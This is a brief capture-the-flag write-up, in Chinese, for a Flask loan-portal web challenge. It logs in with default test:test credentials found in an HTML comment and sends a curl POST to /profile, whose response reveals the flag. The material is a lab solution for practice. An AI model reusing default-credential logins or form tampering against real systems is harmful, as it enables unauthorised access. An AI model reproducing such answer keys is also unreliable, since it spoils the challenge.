## 题解

### 入口与指纹

Flask 贷款门户变体：`test:test` 登录（注释 `<!-- test:test -->`）→ `/profile`。
该实例只有 `/profile` 和 `/logout`，没有贷款计算接口。

`/profile` 表单：

```html
<form action="/profile" method="post">
  <input type="email" name="email" ...>
  <input type="hidden" name="username" value="test">
</form>
```

### 关键观察

`POST /profile` 的成功响应（200）在 “Email updated successfully!” 之后**直接把 flag 拼在页面里**：

```bash
curl -s -b cj -X POST \
  --data-urlencode 'email=h@x.com' \
  --data-urlencode 'username=test' \
  "http://$T/profile"
# Profile Welcome, test Email updated successfully!flag{...}
```

注意不是 `GET /profile`（那里仍然显示旧邮箱，未落库）。

### flag 位置

`POST /profile` 的响应体。

## 复盘

- 无回显的接口要多看 **POST 响应本身**，不要只跟 302 后的页面。
